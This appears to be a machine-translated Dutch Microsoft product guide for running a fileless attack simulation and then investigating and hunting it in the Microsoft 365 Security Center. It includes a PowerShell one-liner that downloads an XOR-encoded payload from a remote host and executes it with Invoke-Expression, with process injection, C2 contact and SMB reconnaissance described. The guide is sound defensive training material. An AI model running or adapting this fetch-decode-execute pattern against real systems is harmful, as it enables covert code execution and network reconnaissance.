---
title: Simulaties van aanvallen van Microsoft Threat Protection uitvoeren
description: Voer aanvals simulaties uit voor uw prototypeproject van Microsoft Threat Protection om te zien hoe dit wordt weergegeven en snel te verhelpen.
keywords: Microsoft Threat Protection pilot aanval, simulatie aanval van de proefversie van Microsoft Threat Protection, Microsoft Threat Protection pilotproject, Cyber beveiliging, Geavanceerd permanent risico, veiligheid van uw onderneming, apparatuur, apparaat, identiteit, gebruikers, gegevens, toepassingen, incidenten, automatisch onderzoek en herstel, geavanceerde jacht
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-evalutatemtp
ms.topic: conceptual
ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 10/06/2020
ms.locfileid: "48368091"
---
# <a name="run-your-microsoft-threat-protection-attack-simulations"></a>Simulaties van aanvallen van Microsoft Threat Protection uitvoeren  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


**Van toepassing op:**
- Microsoft Threat Protection
<br>
<table border="0" width="100%" align="center">
  <tr style="text-align:center;">
    <td align="center" style="width:25%; border:0;" >
      <a href= "https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-plan"> 
        <img src="../../media/mtp/plan.png" alt="Plan your pilot Microsoft Threat Protection project" title="Uw proefproject voor Microsoft Threat Protection plannen" />
      <br/>Regeling </a><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/prepare-mtpeval">
        <img src="../../media/mtp/prep.png" alt="Prepare your Microsoft Threat Protection trial lab or pilot environment" title="Uw proefabonnement voor Microsoft Threat Protection of een testomgeving voorbereiden" />
      <br/>Ervoor </a><br>
    </td>
    <td align="center"bgcolor="#d5f5e3">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-simulate">
        <img src="../../media/mtp/run-sim.png" alt="Run your Microsoft Threat Protection attack simulations" title="Simulaties van aanvallen van Microsoft Threat Protection uitvoeren" />
      <br/>Aanval simuleren </a><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-close">
        <img src="../../media/mtp/close.png" alt="Close and summarize your Microsoft Threat Protection pilot" title="Uw proef Microsoft Threat Protection sluiten en samenvatten" />
      <br/>Sluiten en samenvatten </a><br>
    </td>
  </tr>
  <tr>
    <td style="width:25%; border:0;">
   
    </td>
    <td valign="top" style="width:25%; border:0;">
    
</td>
    <td valign="top" style="width:25%; border:0;">

</td>    
    <td valign="top" style="width:25%; border:0;">

</td>
  </tr>
</table>

U bevindt zich momenteel in de simulatie fase aanval.

Na het voorbereiden van uw testomgeving, is het tijd om het Microsoft Threat Protection-incidentbeheer en het beleid voor automatisch onderzoek en herstel te testen. We helpen u een verfijnde aanval te simuleren die geavanceerde technieken gebruikt om de detectie te verbergen. De aanval wordt geopend server bericht blok (SMB)-sessies op domeincontrollers opgesomd en de nieuwste IP-adressen van gebruikers apparaten ophalen. Meestal bevat dit soort aanvallen geen bestanden die op het apparaat van het slachtoffer worden neergezet, ze worden alleen in het geheugen weergegeven. Met behulp van de bestaande systeem-en beheerprogramma's en injecteert ze de uitvoering ervan en injecteert ze de uitvoering ervan, zodat ze de uitvoering van evade kunnen opsporen en persisteren op het apparaat.

In deze simulatie begint ons voorbeeldscenario met een PowerShell-script. Een gebruiker kan een script uitvoeren. Of het script kan vanaf een externe verbinding vanaf een eerder besmet apparaat worden uitgevoerd vanaf een externe verbinding met een andere computer: de aanvaller probeert later te navigeren in het netwerk. Detectie van deze scripts kan lastig zijn omdat beheerders vaak scripts ook extern uitvoeren om diverse beheeractiviteiten uit te voeren.

![Niet-gefileeerde PowerShell-aanval met proces injectie en SMB Reconnaisance-aanvals diagram](../../media/mtp/mtpdiydiagram.png)

Tijdens de simulatie injecteert de aanval shellcode in een schijnbaar onschuldige proces. In dit scenario gebruiken we notepad.exe. We hebben dit proces voor de simulatie gekozen, maar kwaadwillende gebruikers zullen waarschijnlijk een lang actief systeemproces bereiken, zoals svchost.exe. Met de shellcode kunt u contact opnemen met de opdracht van de aanvaller en de controle (C2) om instructies te ontvangen voor het doorvoeren van de gebruikersnaam. Daarnaast worden met de scripts geprobeerd om Reconnaissance-query's uit te voeren op de domeincontroller (DC). Hiermee kan een aanvaller informatie krijgen over recente aanmeldinformatie van gebruikers. Wanneer hackers deze informatie hebben, kunnen ze later in het netwerk navigeren om naar een specifiek gevoelige account te gaan.

>[!IMPORTANT]
>Voor optimale resultaten volgt u de instructies voor de simulatie van een aanval.


## <a name="simulation-environment-requirements"></a>Vereisten voor simulatie omgeving

Aangezien u de testomgeving al hebt geconfigureerd tijdens de voorbereidende fase, moet u ervoor zorgen dat u twee apparaten hebt voor dit scenario: een testapparaat en een domeincontroller.

1.  Controleer of uw Tenant [Microsoft Threat Protection heeft ingeschakeld](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).
2.  Controleer de configuratie van de domeincontroller voor testen:
    - Apparaat wordt uitgevoerd met Windows Server 2008 R2 of een latere versie.
    - De test domeincontroller naar [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) en schakelt [extern beheer](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)in.    
    - Controleer of de [beveiligings integratie van Azure ATP en Microsoft Cloud app](https://docs.microsoft.com/cloud-app-security/aatp-integration) is ingeschakeld.
    - Een testgebruiker wordt in uw domein gemaakt – geen beheerdersmachtigingen nodig.

3.  Controleer de configuratie van de testapparatuur:
    <br>
    a.  Een apparaat met Windows 10 versie 1903 of een latere versie wordt uitgevoerd.
    <br>
    b.  Testapparaat is verbonden met het test domein.
    <br>
    c.  [Schakel Windows Defender antivirus in](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Als u problemen ondervindt bij het inschakelen van Windows Defender antivirus, raadpleegt u dit [onderwerp over probleemoplossing](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    <br>
    d.  Controleer of het testapparaat is [geboardd naar Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Als u een bestaande Tenant gebruikt en apparaatgroepen implementeert, maakt u een speciale apparaatklasse voor het testapparaat en duwt u dit naar het hoogste niveau in de configuratie UX.


## <a name="run-the-simulation"></a>De simulatie uitvoeren

De simulatie van het aanvalsscenario uitvoeren:

1.  Meld u aan bij het testapparaat met het gebruikersaccount testen.

2.  Open een Windows PowerShell-venster op het testapparaat.

3.  Kopieer het volgende simulatie script:
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
>Als u dit document opent in een webbrowser, kunt u problemen ondervinden met het kopiëren van de volledige tekst zonder dat u bepaalde tekens kwijtraakt of om extra regeleinden te voorkomen. Download dit document en open het in Adobe Reader.

4. Plak en voer het gekopieerde script uit wanneer u hierom wordt gevraagd.

>[!NOTE]
>Als u PowerShell uitvoert met Remote Desktop Protocol (RDP), gebruikt u de opdracht Klembord tekst typen in de RDP-client, aangezien de **CTRL-V** -sneltoets of de rechtermuisknop functie mogelijk niet werkt.  In recente versies van PowerShell wordt de methode soms ook niet geaccepteerd, u moet mogelijk eerst naar Kladblok kopiëren, dit in de virtuele machine kopiëren en vervolgens in PowerShell plakken.

Een paar seconden later <i>notepad.exe</i> wordt geopend. Een gesimuleerde aanvals code wordt in notepad.exe geïnjecteerd. Zorg dat het automatisch gegenereerde Notepad-exemplaar geopend blijft voor het volledige scenario.

De gesimuleerde aanvaller probeert met een extern IP-adres te communiceren (de C2-server te simuleren) en probeert vervolgens Reconnaissance te communiceren via de domeincontroller via SMB.

U ziet een bericht dat wordt weergegeven op de PowerShell-console wanneer dit script is voltooid.

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

Als u de functie automatisch incidenten en antwoord in actie wilt zien, moet u de notepad.exe open laten. U ziet een automatisch incident en antwoord stopt het Kladblok proces.


## <a name="investigate-an-incident"></a>Een incident onderzoeken

>[!NOTE]
>Bekijk eerst de volgende video om te zien hoe het beheer van uw contactpersonen u helpt bij het onderzoek, waar u deze kunt vinden in de portal, en hoe u het kunt helpen bij het uitvoeren van beveiligingsbewerkingen:

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Als u overstapt op het punt van de burger Analyst-weergave, kunt u nu beginnen met het onderzoeken van de aanval in de portal Microsoft 365 Security Center. 

1.  Open de wachtrij voor incidenten van [Microsoft 365 Security Center](https://security.microsoft.com/incidents) van elk apparaat.

2.  Ga in het menu naar **incidenten** . 

    ![Schermafbeelding van incidenten zoals weergegeven op het menu aan de linkerkant van het Microsoft 365-Beveiligingscentrum](../../media/mtp/fig1.png)

3.  Het nieuwe incident voor de gesimuleerde aanval wordt weergegeven in de wachtrij voor incidenten.
 
    ![Schermafbeelding van de incidenten wachtrij](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a>Onderzoek een aanval als één incident

Microsoft Threat Protection verbindt alle gerelateerde waarschuwingen en onderzoek van verschillende producten tot één incident entiteit. Op deze manier laat Microsoft Threat Protection een bredere verhaal vormen, zodat de SOC-analist de ingewikkelde bedreigingen begrijpt en erop kan reageren.

De waarschuwingen die zijn gegenereerd tijdens deze simulatie, worden geassocieerd met dezelfde bedreiging, en worden als resultaat automatisch geaggregeerd als één incident.

Het incident weergeven:

1.  Ga naar de wachtrij voor **incidenten** .
 
    ![Schermafbeelding van incidenten in het navigatiemenu](../../media/mtp/fig1.png)

2.  Selecteer het nieuwste item door te klikken op de cirkel die zich links van de naam van het incident bevindt. Aan een side panel wordt aanvullende informatie over het incident weergegeven, inclusief alle verwante meldingen. Elk incident heeft een unieke naam waarmee dit wordt beschreven op basis van de kenmerken van de meldingen die dit bevat.

    ![Schermafbeelding van de pagina met incidenten waarop gegenereerde waarschuwingen worden geaggregeerd tijdens de simulatie](../../media/mtp/fig4.png)

    De waarschuwingen die in het dashboard worden weergegeven, kunnen worden gefilterd op basis van servicebronnen: Azure ATP, Microsoft Cloud app Security, Microsoft Defender ATP, Microsoft Threat Protection en Office ATP.  

3.  Selecteer **incident pagina openen** om meer informatie over het incident te weten te komen.

    Op de pagina **incidenten** ziet u alle meldingen en informatie over het incident. Dit omvat de entiteiten en activa in de waarschuwing, de detectiebron van de waarschuwingen (Azure ATP, EDR), en de reden waarom ze samen met elkaar zijn verbonden. Wanneer u de lijst met incidenten van meldingen controleert, wordt de voortgang van de aanval weergegeven. In deze weergave kunt u de afzonderlijke waarschuwingen zien en onderzoeken.

    U kunt ook klikken op **incident beheren** in het menu aan de rechterkant, om het incident te markeren, het aan uzelf toe te wijzen en opmerkingen toe te voegen.

    ![Schermafbeelding van de locatie waarop u wilt klikken](../../media/mtp/fig5a.png)

    ![Schermafbeelding van de velden in het deelvenster incident beheren, waar u het incident kunt markeren, het aan uzelf kunt toewijzen en opmerkingen kunt toevoegen ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a>Gegenereerde waarschuwingen controleren 

Laten we eens kijken naar enkele waarschuwingen die zijn gegenereerd tijdens de gesimuleerde aanval.

>[!NOTE]
>We lopen slechts enkele waarschuwingen die zijn gegenereerd tijdens de gesimuleerde aanval. Afhankelijk van de versie van Windows en de Microsoft Threat Protection-producten die op uw testapparaat worden uitgevoerd, ziet u mogelijk meer waarschuwingen die in iets anders in een andere volgorde worden weergegeven.

![Schermafbeelding van gegenereerde waarschuwingen](../../media/mtp/fig6.png) 


**Waarschuwing: verdacht verdacht proces injectie (Bron: Microsoft Defender ATP EDR)**

Geavanceerde kwaadwillende gebruikers gebruiken verfijnde en verfijnde methoden om in het geheugen te blijven staan en ze te verbergen voor detectie hulpprogramma's. U kunt zich een gang doen vanuit een vertrouwd systeemproces, in plaats van een schadelijk uitvoerbaar bestand, zodat u het programma moeilijk kunt detecteren en beveiligingsbewerkingen kunt uitvoeren.

Om ervoor te zorgen dat de technische analisten deze geavanceerde aanvallen kunnen ondervangen, biedt u onze cloudservice met ongeëvenaarde zichtbaarheid in diverse code injectie technieken. In de volgende afbeelding ziet u hoe Microsoft Defender ATP is gedetecteerd en een melding wordt weergegeven bij het invoeren van code <i>notepad.exe</i>.

![Schermafbeelding van de melding voor de injectie van mogelijk schadelijke code](../../media/mtp/fig7.png) 


**Waarschuwing: het onverwachte gedrag van een proces wordt uitgevoerd zonder opdrachtregelargumenten (Bron: Microsoft Defender ATP EDR)**

Microsoft Defender ATP-detecteren vaak richten op het meest voorkomende kenmerk van een aanvalsmethode. Hierdoor wordt de duurzaamheid gegarandeerd en wordt de balk voor hackers omgewisseld met de nieuwe tactiek.

We maken gebruik van leer algoritmen voor grootschalige lessen om het normale gedrag van veelvoorkomende processen binnen een organisatie en wereldwijd te creëren en te kijken wanneer deze processen afwijkend gedrag tonen. Dit anomalie gedrag duidt vaak op dat de programmacode is ingevoerd en wordt uitgevoerd in een ander vertrouwd proces.

Voor dit scenario verloopt het proces <i>notepad.exe</i> abnormaal gedrag, waarbij communicatie met een externe locatie wordt aangewend. Dit resultaat is onafhankelijk van de specifieke methode die wordt gebruikt om de schadelijke code in te voeren en uit te voeren.

>[!NOTE]
>Omdat deze melding wordt weergegeven op basis van computer-trainings modellen waarvoor extra backend-verwerking is vereist, kan het enige tijd duren voordat deze melding wordt weergegeven op de portal.

U ziet dat de details van de waarschuwing ook het externe IP-adres zijn: een indicator die u kunt gebruiken als draai om onderzoek uit te vouwen.

Klik op het IP-adres in de structuur van het waarschuwings proces om de pagina met IP-adresdetails weer te geven.

![Schermafbeelding van de waarschuwing voor onverwachte werking van een proces dat wordt uitgevoerd zonder opdrachtregelargumenten](../../media/mtp/fig8.png) 

In de volgende afbeelding ziet u de geselecteerde pagina met details van IP-adres (Klik op IP-adres in de boomstructuur van het waarschuwings proces).
![Schermafbeelding van de pagina Details van IP-adres](../../media/mtp/fig9.png)


**Waarschuwing: gebruikers-en IP-adres Reconnaissance (SMB) (Bron: Azure ATP)**

Met behulp van inventarisatie met behulp van SMB-protocol (Server Message Block) kunnen hackers recente gebruikers aanmeldinformatie verkrijgen waarmee ze later via het netwerk kunnen navigeren om toegang te krijgen tot een specifiek gevoelige account.

Bij deze detectie wordt een waarschuwing geactiveerd wanneer de SMB-sessie inventarisatie wordt uitgevoerd voor een domeincontroller.

![Schermafbeelding van de Azure ATP-waarschuwing voor gebruikers-en IP-adres Reconnaissance](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-atp"></a>De tijdlijn van het apparaat controleren [Microsoft Defender ATP]
Wanneer u de verschillende meldingen in dit incident hebt onderzocht, gaat u terug naar de pagina met het incident dat u eerder hebt onderzocht. Ga naar het tabblad **apparaten** op de pagina incidenten om te controleren welke apparaten bij dit incident zijn betrokken, zoals gerapporteerd in Microsoft Defender ATP en Azure ATP.

Klik op de naam van het apparaat waarop de aanval is uitgevoerd om de entiteits pagina voor dat specifieke apparaat te openen. Op deze pagina kunt u waarschuwingen weergeven die zijn geactiveerd en de gerelateerde gebeurtenissen.

Klik op het tabblad **tijdlijn** om de tijdlijn van het apparaat te openen en alle gebeurtenissen en gedragingen die op het apparaat worden weergegeven in chronologische volgorde weer te geven, waarbij de waarschuwingen zijn getreden.

![Schermafbeelding van de tijdlijn van het apparaat met gedrag](../../media/mtp/fig11.png) 

Het uitvouwen van een paar van de interessantere gedragingen bieden nuttige informatie, zoals proces bomen.

Schuif bijvoorbeeld omlaag totdat u bij de gebeurtenis **verdacht verdacht proces de injectie**vindt. Klik op de **powershell.exe die u hebt ingevoegd op notepad.exe proces** gebeurtenis eronder, om de volledige processtructuur weer te geven voor dit gedrag onder de grafiek **gebeurtenis entiteiten** in het zijvenster. Gebruik de zoekbalk om zo nodig te filteren.

![Schermafbeelding van de processtructuur voor het geselecteerde gedrag van het maken van PowerShell-bestanden](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Controleer de gebruikersgegevens [Microsoft Cloud app security]

Op de pagina incident klikt u op het tabblad **gebruikers** om een lijst weer te geven met gebruikers die betrokken zijn bij de aanval. De tabel bevat extra informatie over elke gebruiker, waaronder de **onderzoek prioriteit** van elke gebruiker.

Klik op de gebruikersnaam om de profielpagina van de gebruiker te openen waar verder onderzoek kan worden uitgevoerd. [Meer informatie over het onderzoeken van risico gebruikers](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).
<br>
![Schermafbeelding van de pagina met beveiligings gebruikers van de Cloud-app](../../media/mtp/fig13.png)


## <a name="automated-investigation-and-remediation"></a>Automatisch onderzoek en herstel
>[!NOTE]
>Voordat u via deze simulatie verdergaat, bekijkt u de volgende video om vertrouwd te raken met wat automatisch herstel is, waar u het kunt vinden in de portal en hoe u het kunt helpen bij uw beveiligingsactiviteiten:

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Ga terug naar het incident in het Microsoft 365 Security Center Portal. Het tabblad **onderzoeken** op de pagina **incident** toont de geautomatiseerde onderzoeken die zijn geactiveerd door Azure ATP en Microsoft Defender ATP. Met de onderstaande schermafbeelding wordt alleen het geautomatiseerd onderzoek weergegeven dat wordt geactiveerd door Microsoft Defender ATP. Standaard worden in Microsoft Defender ATP automatisch de artefacten opgelost die zijn gevonden in de wachtrij waarvoor herstel nodig is.

![Schermafbeelding van geautomatiseerde onderzoeken met betrekking tot het incident](../../media/mtp/fig14.png)

Klik op de waarschuwing die een onderzoek heeft geactiveerd om de pagina **Details van onderzoek** te openen. U ziet het volgende:
- Waarschuwing (s) die het geautomatiseerde onderzoek hebben geactiveerd.
- Beïnvloede gebruikers en apparaten. Als indicatoren zijn gevonden op extra apparaten, worden deze extra apparaten ook weergegeven.
- Lijst met bewijzen. De entiteiten zijn gevonden en geanalyseerd, zoals bestanden, processen, services, Stuurprogramma's en netwerkadressen. Deze entiteiten worden geanalyseerd op mogelijke relaties voor de waarschuwing en zijn geclassificeerd als schadelijk of schadelijk.
- Bedreigingen gevonden. Bekende bedreigingen die tijdens het onderzoek zijn gevonden.

>[!NOTE]
>Afhankelijk van de tijdsinstellingen, kan het geautomatiseerde onderzoek mogelijk nog steeds actief zijn. Wacht een paar minuten totdat het proces is voltooid voordat u het bewijs gaat verzamelen en analyseren en Bekijk de resultaten. Vernieuw de pagina met **onderzoek Details** om de meest recente bevindingen te vinden.

![Schermafbeelding van de pagina Details van onderzoek](../../media/mtp/fig15.png)

Tijdens het geautomatiseerde onderzoek heeft Microsoft voor de ATP-ATP de notepad.exe proces geïdentificeerd, dat werd geïnjecteerd als een van de artefacten waarvoor herstel nodig is. Microsoft Defender ATP stopt automatisch de verdachte proces injectie als onderdeel van de geautomatiseerde herbemiddeling. 

U kunt <i>notepad.exe</i> verdwijnen uit de lijst met actieve processen op het testapparaat.

## <a name="resolve-the-incident"></a>Het incident oplossen

Wanneer het onderzoek is voltooid en bevestigd, moet u het incident sluiten.

Klik op **incident beheren**. Stel de status voor het **oplossen van incidenten** in en selecteer de gewenste classificatie.

Wanneer het incident is verholpen, worden alle bijbehorende waarschuwingen in Microsoft 365 Beveiligingscentrum en in de bijbehorende portals gesloten.

![Schermafbeelding van de pagina met incidenten, waarop u kunt klikken op de schakeloptie om het probleem op te lossen](../../media/mtp/fig16.png) 

<br>
Hiermee wordt de simulatie van de aanval voor incidentenbeheer en voor automatisch onderzoek en herstelscenario's gewikkeld. Met de volgende simulatie wordt u begeleid bij de proactief ondernemen voor schadelijke bestanden. 

## <a name="advanced-hunting-scenario"></a>Scenario voor Geavanceerd jacht

>[!NOTE]
>Bekijk de volgende video voor meer informatie over de basisbeginselen van de ervaring, zie waar u deze kunt vinden in de portal en hoe u het kunt helpen bij het uitvoeren van beveiligingsbewerkingen:

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Voorschriften voor de jacht omgeving
Er is één intern postvak en apparaat vereist voor dit scenario. U hebt ook een externe e-mailaccount nodig om het testbericht te verzenden.

1.  Controleer of uw Tenant [Microsoft Threat Protection heeft ingeschakeld](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).
2.  Aangeven dat een doel postvak moet worden gebruikt voor het ontvangen van e-mail.
    a.  Dit postvak moet worden gecontroleerd in Office 365 ATP, b.  Het apparaat van behoefte 3 moet toegang hebben tot dit postvak
3.  Configureer een testapparaat: a.  Zorg dat u Windows 10 versie 1903 of hoger gebruikt.
    b.  Neem deel aan het test domein.
    c.  [Schakel Windows Defender antivirus in](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Als u problemen ondervindt bij het inschakelen van Windows Defender antivirus, raadpleegt u [dit onderwerp over probleemoplossing](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    d.  [Onboarding to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### <a name="run-the-simulation"></a>De simulatie uitvoeren
1.  Stuur via een extern e-mailaccount een e-mailbericht naar het postvak dat is gevonden in stap 2 van de sectie vereisten voor testomgeving. Voeg een bijlage toe die wordt toegestaan via elk bestaand e-mail filter beleid.  Dit bestand hoeft niet te zijn schadelijk of een uitvoerbaar bestand. Voorgestelde bestandstypen zijn <i>. PDF</i>, <i>. exe</i> (indien toegestaan) of Office-document, zoals een Word-bestand.
2.  Open het verzonden e-mailbericht van het apparaat dat is geconfigureerd in stap 3 van de sectie omgevingsvereisten testen. Open de bijlage of sla het bestand op het apparaat op.


**Go-jacht**
1.  Open de portal van security.microsoft.com.
2.  Ga naar de **jacht > geavanceerde jacht**.

    ![Schermafbeelding van een geavanceerde jacht op de navigatiebalk van het M365 Security Center Portal](../../media/mtp/fig17.png) 

3.  Maak een query die begint met het verzamelen van e-mail gebeurtenissen.
    a.  Selecteer in het deelvenster query de optie Nieuw.
    b.  Dubbelklik op de tabel EmailEvents van het schema.

```
EmailEvents 
```                                        

   c.   De laatste 24 uur van het tijdsbestek wijzigen. Ervan uitgaand dat de e-mail die u hebt verzonden toen u de bovenstaande simulatie uitvoerde, stond in de afgelopen 24 uur, anders wijzigt u de tijdsperiode.
   ![Schermafbeelding van de locatie waar u de periode kunt wijzigen. De vervolgkeuzelijst openen om te kiezen uit een tijdsbestek](../../media/mtp/fig18.png) 


   d.   Voer de query uit.  Het kan zijn dat u veel resultaten hebt, afhankelijk van de omgeving van de prototype.  

>[!NOTE]
>Zie de volgende stap voor het filteren van opties om het resultaat van de gegevens te beperken.

   ![Schermafbeelding van de zoekresultaten van de geavanceerde jacht](../../media/mtp/fig19.png) 

>[!NOTE]
>Geavanceerde jacht geeft queryresultaten weer als tabelgegevens. U kunt ook kiezen voor het weergeven van de gegevens in andere notatie typen, zoals grafieken.    

   e.   Bekijk de resultaten en kijk of u het e-mailbericht dat u hebt geopend kunt identificeren.  Het kan tot 2 uur duren voordat het bericht in de geavanceerde jacht wordt weergegeven. Als de e-mail omgeving grote en veel resultaten bevat, kunt u de **optie filters weergeven** gebruiken om het bericht te zoeken. 

   In het voorbeeld is het e-mailbericht verzonden via een Yahoo-account. Klik op het **+** pictogram naast **Yahoo.com** onder de sectie SenderFromDomain en klik vervolgens op **toepassen** om het geselecteerde domein toe te voegen aan de query.  U moet het domein of e-mailaccount gebruiken dat is gebruikt voor het verzenden van het testbericht in stap 1 van de simulatie uitvoeren om de resultaten te filteren.  Voer de query opnieuw uit om een kleinere resultatenset te krijgen om te controleren of het bericht in de simulatie wordt weergegeven.
   
   ![Schermafbeelding van de filters. U kunt filters gebruiken om de zoekopdracht te verfijnen en te vinden wat u zoekt.](../../media/mtp/fig20.png) 


```
EmailEvents 
| where SenderMailFromDomain == "yahoo.com"
```

   f.   Klik op de uitkomst rijen van de query, zodat u de record kunt controleren.
   ![Schermafbeelding van het deelvenster opnemen van de controle die wordt geopend wanneer een geavanceerd zoekresultaat wordt geselecteerd](../../media/mtp/fig21.png) 


4.  Nu u hebt gecontroleerd of u het e-mailbericht kunt zien, voegt u een filter toe voor de bijlagen. Richt u op alle e-mailberichten met bijlagen in de omgeving. Voor dit scenario zijn de focus op inkomende e-mailberichten, niet voor berichten die vanuit uw omgeving worden verzonden. Verwijder filters die u hebt toegevoegd om het bericht op te halen en voeg "| waarbij **AttachmentCount > 0** en **EmailDirection**  ==  **"inkomende" "**

In de volgende query ziet u het resultaat voor een kortere lijst dan de aanvankelijke query voor alle e-mail gebeurtenissen:

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"

```

5.  Neem vervolgens de informatie over de bijlage op (bijvoorbeeld: bestandsnaam, hashes) in de resultatenset. U kunt dit doen door lid te worden van de tabel **EmailAttachmentInfo** . De veelgebruikte velden die u kunt gebruiken om deel te nemen in dit geval zijn **NetworkMessageId** en **RecipientObjectId**.

De volgende query bevat ook een extra regel | **Project: Wijzig de naam van EmailTimestamp = tijdstempel**, zodat u kunt zien welke tijdstempels zijn gerelateerd aan de e-mail en tijdstempels die te maken hebben met de volgende stap.

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
```

6.  Gebruik vervolgens de waarde **sha256** in de tabel **EmailAttachmentInfo** om **DeviceFileEvents** (bestandsacties die op het eindpunt plaatsvond) voor die hash te zoeken.  Het veld gebruikelijk is de SHA256-hash voor de bijlage.

De resultaattabel bevat nu gegevens uit het eindpunt (Microsoft Defender ATP), zoals de apparaatnaam, de actie die is uitgevoerd (in dit geval gefilterd op alleen FileCreated-gebeurtenissen) en de locatie waar het bestand is opgeslagen. De naam van het account dat is gekoppeld aan het proces, wordt ook opgenomen.

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
```

U hebt nu een query gemaakt waarmee alle inkomende e-mailberichten worden geïdentificeerd waarbij de gebruiker de bijlage heeft geopend of opgeslagen. U kunt deze query ook verfijnen om te filteren op specifieke domeinen, bestanden, bestandstypen, enzovoort.

7.  Functies vormen een speciale combineren van joins waarmee u meer TI-gegevens over een bestand kunt halen, zoals de prevalente, onderteken-en uitgeversinformatie, enzovoort.  Als u meer wilt weten over het bestand, gebruikt u de functie verrijking **FileProfile ()** .

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
| distinct SHA1
| invoke FileProfile()
```


**Een detectie maken**

Wanneer u een query hebt gemaakt met informatie waarover u een **melding wilt ontvangen** als ze in de toekomst plaatsvinden, kunt u een aangepaste detectie maken van de query. 

Door aangepaste detecties wordt de query uitgevoerd volgens de frequentie die u hebt ingesteld, en met de resultaten van de query's maakt u beveiligingswaarschuwingen, op basis van de beïnvloede activa die u kiest. Deze meldingen komen overeen met incidenten en kunnen worden triaged als een andere Beveiligingsmelding die wordt gegenereerd door een van de producten.

1.  Op de pagina query verwijdert u de regel 7 en 8 die u hebt toegevoegd in stap 7 van de instructies voor het uitvoeren van de stappen en klikt u op **detectieregel maken**. 
    
    ![Schermafbeelding van waar u op detectieregel maken kunt klikken op de pagina Geavanceerde jacht](../../media/mtp/fig22.png) 

>[!NOTE]
>Als u klikt op **detectieregel maken** en er syntaxisfouten zijn in uw query, wordt uw detectieregel niet opgeslagen. Controleer de query om te controleren of er geen fouten zijn. 


2.  Vul de vereiste velden in met de gegevens waarmee het beveiligingsteam de melding begrijpt, waarom de melding is gegenereerd en welke acties u ervan verloopt. 

    ![Schermafbeelding van de pagina detectieregel maken waarop u de details van de waarschuwing kunt definiëren](../../media/mtp/fig23.png)

Zorg ervoor dat u de velden vult met de duidelijkheid, zodat de volgende gebruiker een weloverwogen beslissing geeft over deze detectieregel waarschuwing 

3.  Selecteer de entiteiten die in deze waarschuwing worden beïnvloed. Selecteer **apparaat** en **Postvak**in dit geval.

    ![Schermafbeelding van de pagina detectieregel maken waarop u de parameters van de beïnvloede entiteiten kunt kiezen.](../../media/mtp/fig24.png)
 

